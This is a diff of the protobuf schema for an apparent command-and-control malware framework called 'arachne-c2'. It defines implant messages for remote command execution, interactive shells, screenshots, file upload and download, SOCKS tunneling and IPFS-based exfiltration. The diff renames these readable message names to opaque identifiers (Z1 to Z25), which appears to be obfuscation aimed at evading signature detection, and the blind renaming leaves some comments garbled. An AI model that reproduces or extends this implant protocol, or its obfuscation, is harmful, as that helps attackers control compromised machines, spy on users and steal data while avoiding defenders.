@@ -1,8 +1,8 @@
 syntax = "proto3";
-package arachnepb;
-option go_package = "github.com/portbuster1337/arachne-c2/protobuf/arachnepb";
+package apb;
+option go_package = "github.com/portbuster1337/ArachneC2/protobuf/apb";
 
-import "commonpb/common.proto";
+import "cpb/common.proto";
 
 // Envelope wraps all messages sent between operator and implant
 message Envelope {
@@ -32,8 +32,8 @@ message Register {
   string Locale = 15;
 }
 
-// BeaconRegister - Used for async beacon mode
-message BeaconRegister {
+// Z1 - Used for async beacon mode
+message Z1 {
   string ID = 1;
   int64 Interval = 2;
   int64 Jitter = 3;
@@ -44,48 +44,48 @@ message BeaconRegister {
 // Ping - Keepalive / round-trip test
 message Ping {
   int32 Nonce = 1;
-  commonpb.Response Response = 8;
-  commonpb.Request Request = 9;
+  cpb.Response Response = 8;
+  cpb.Request Request = 9;
 }
 
-// KillReq - Request implant to die
-message KillReq {
-  commonpb.Request Request = 9;
+// Z4 - Request implant to die
+message Z4 {
+  cpb.Request Request = 9;
 }
 
-// PsReq - List processes
-message PsReq {
-  commonpb.Request Request = 9;
+// Z12 - List processes
+message Z12 {
+  cpb.Request Request = 9;
 }
 
-message Ps {
-  repeated commonpb.Process Processes = 1;
-  commonpb.Response Response = 9;
+message Z13 {
+  repeated cpb.Process Processes = 1;
+  cpb.Response Response = 9;
 }
 
-// ExecuteReq - Run a command
-message ExecuteReq {
+// Z14 - Run a command
+message Z14 {
   string Path = 1;
   repeated string Args = 2;
   bool Output = 3;
-  commonpb.Request Request = 9;
+  cpb.Request Request = 9;
 }
 
-message Execute {
+message Z15 {
   uint32 Status = 1;
   bytes Stdout = 2;
   bytes Stderr = 3;
   uint32 Pid = 4;
-  commonpb.Response Response = 9;
+  cpb.Response Response = 9;
 }
 
-// LsReq - List directory
-message LsReq {
+// Z16 - List directory
+message Z16 {
   string Path = 1;
-  commonpb.Request Request = 9;
+  cpb.Request Request = 9;
 }
 
-message FileInfo {
+message Z18 {
   string Name = 1;
   bool IsDir = 2;
   int64 Size = 3;
@@ -94,89 +94,89 @@ message FileInfo {
   string Link = 6;
 }
 
-message Ls {
+message Z17 {
   string Path = 1;
   bool Exists = 2;
-  repeated FileInfo Files = 3;
-  commonpb.Response Response = 9;
+  repeated Z18 Files = 3;
+  cpb.Response Response = 9;
 }
 
-// CdReq - Change directory
-message CdReq {
+// Z19 - Change directory
+message Z19 {
   string Path = 1;
-  commonpb.Request Request = 9;
+  cpb.Request Request = 9;
 }
 
-message PwdReq {
-  commonpb.Request Request = 9;
+message Z20 {
+  cpb.Request Request = 9;
 }
 
-message Pwd {
+message Z21 {
   string Path = 1;
-  commonpb.Response Response = 9;
+  cpb.Response Response = 9;
 }
 
-// DownloadReq - Download file from implant
-message DownloadReq {
+// Z22 - Z23 file from implant
+message Z22 {
   string Path = 1;
-  commonpb.Request Request = 9;
+  cpb.Request Request = 9;
 }
 
-message Download {
+message Z23 {
   string Path = 1;
   bool Exists = 2;
   bytes Data = 3;
-  commonpb.Response Response = 9;
+  cpb.Response Response = 9;
 }
 
-// UploadReq - Upload file to implant
-message UploadReq {
+// Z24 - Z25 file to implant
+message Z24 {
   string Path = 1;
   bytes Data = 2;
   bool Overwrite = 3;
-  commonpb.Request Request = 9;
+  cpb.Request Request = 9;
 }
 
-message Upload {
+message Z25 {
   string Path = 1;
   int32 BytesWritten = 2;
-  commonpb.Response Response = 9;
+  cpb.Response Response = 9;
 }
 
-// ScreenshotReq - Capture screen
-message ScreenshotReq {
-  commonpb.Request Request = 9;
+// Z2 - Capture screen
+message Z2 {
+  cpb.Request Request = 9;
 }
 
-message Screenshot {
+message Z3 {
   bytes Data = 1;
-  commonpb.Response Response = 9;
+  cpb.Response Response = 9;
 }
 
-// ShellReq - Open interactive shell
-message ShellReq {
+// Z5 - Open interactive shell
+message Z5 {
   string Path = 1;
   bool EnablePTY = 2;
   uint32 Pid = 3;
   uint64 TunnelID = 8;
-  commonpb.Request Request = 9;
+  cpb.Request Request = 9;
 }
 
-message Shell {
+message Z6 {
   string Path = 1;
   bool EnablePTY = 2;
   uint32 Pid = 3;
   uint64 TunnelID = 8;
-  commonpb.Response Response = 9;
+  cpb.Response Response = 9;
 }
 
-// Tunnel - Stream tunnel
-message Tunnel {
+// Z7 - Stream tunnel
+message Z7 {
   uint64 TunnelID = 8;
   string SessionID = 9;
 }
 
-message TunnelData {
+message Z8 {
   bytes Data = 1;
   bool Closed = 2;
   uint64 Sequence = 3;
@@ -185,25 +185,25 @@ message TunnelData {
 }
 
 // Socks5 proxy
-message Socks {
+message Z9 {
   uint64 TunnelID = 8;
   string SessionID = 9;
 }
 
-message SocksData {
+message Z10 {
   bytes Data = 1;
   bool CloseConn = 2;
   uint64 Sequence = 5;
   uint64 TunnelID = 8;
-  commonpb.Request Request = 9;
+  cpb.Request Request = 9;
 }
 
-// ExfilData - IPFS-based exfiltration reference
-message ExfilData {
+// Z11 - IPFS-based exfiltration reference
+message Z11 {
   string CID = 1;
   bytes Key = 2;
   string FileName = 3;
   int64 Size = 4;
   uint32 Type = 5;
-  commonpb.Response Response = 9;
+  cpb.Response Response = 9;
 }
